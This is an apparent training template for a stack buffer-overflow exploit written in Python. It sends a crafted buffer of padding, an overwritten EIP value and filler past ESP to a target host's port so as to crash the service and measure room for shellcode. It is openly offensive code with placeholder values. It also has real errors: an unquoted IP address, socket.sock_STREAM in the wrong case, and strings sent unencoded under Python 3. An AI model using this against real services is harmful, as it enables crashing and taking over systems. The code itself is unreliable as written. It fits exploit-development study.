#!/usr/bin/python3
# Socket: Needed to send data to the port socket of the target host.
# Sys: Needed to exit the python program if we are unable to connect to the target host.
import socket, sys

# CHANGE THESE!!!
target_IP = 1.1.1.1
target_port = XXXX
## Enter in the msf-pattern_offset amount.
pattern_offset_value = "A" * [input length outputed by msf-pattern_offset]
EIP = "B" * 4
## Enter the amount of byte space that seperates EIP and ESP from crash using previous script.
EIP_to_ESP = "C" * XXXX
new_buffer = "D" * 500

# Try statement that will send data until it receives an exception from the target host where it is no longer reachable because we crashed it.
try:
  # Print out confirmation of request being sent to the target host. 
  print ("\nSending Payload")
    
  # Initialize and send input_buffer variable fuzzing data through the socket to the target host.
  s = socket.socket (socket.AF_INET, socket.sock_STREAM)
  s.connect((target_IP, target_port))
  s.send(pattern_offset_value + EIP + EIP_to_ESP + new_buffer)
  s.close()
    
  # Print confirmation after a full socket creation, data sending, and tear down successfully occurs.
  print ("\nSent")
  
# Except statement to catch when the target host program is not responding to data being sent to it.
except:
  print ("\nCould not connect")
  # Exit the python program when we aren't able to send data to the target host.
  sys.exit()